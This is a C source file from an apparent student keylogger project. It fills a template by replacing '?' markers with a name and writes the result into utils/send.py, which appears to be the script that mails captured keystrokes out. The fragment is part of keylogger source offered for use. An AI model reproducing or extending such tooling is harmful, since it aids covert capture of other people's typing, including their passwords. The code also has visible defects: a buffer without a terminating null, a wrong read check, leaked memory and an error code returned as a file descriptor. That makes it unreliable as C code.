/*
** edit_mail.c for keylogger in /home/azword/delivery/Perso/PSU/Keylogger
** 
** Made by Nathan Tréhout | Az'
** Login   <nathan.trehout@epitech.eu>
** 
** Started on  Thu Dec 22 15:50:31 2016 Nathan Trehout
** Last update Sat Dec 31 14:57:11 2016 Nathan Trehout
*/

#include "my.h"

char    *set_name(char *name, char *buffer, char *dest)
{
  int   i;
  int   k;
  int	j;

  i = k = j = 0;
  while (buffer[i] != '\0')
    {
      if (buffer[i] == '?')
	{
	  i = i + 2;
	  while (name[j])
	    {
	      dest[k] = name[j];
	      j++;
	      k++;
	    }
	  j = 0;
	  dest[k] = '\n';
	}
      dest[k] = buffer[i];
      k++;
      i++;
    }
  return (dest);
}

void	create_python(int fd, char *dest)
{
  my_putstr(dest);
  write(fd, dest, my_strlen(dest));
  perror("write");
}

void     prepare_python(int fd, char *name)
{
  char  *buffer;
  char  *dest;

  dest = malloc(sizeof(char) * 5000);
  buffer = malloc(sizeof(char) * 5000);
  if (read(fd, buffer, 5000) == 1)
    exit (84);
  dest = set_name(name, buffer, dest);
  close(fd);
  create_python(fs_open_file("utils/send.py"), dest);
}

int fs_open_file(char *path)
{
  int   file_desc;

  file_desc = open(path, O_RDWR);
  if (file_desc == -1)
    {
      return (84);
    }
  return (file_desc);
}
 
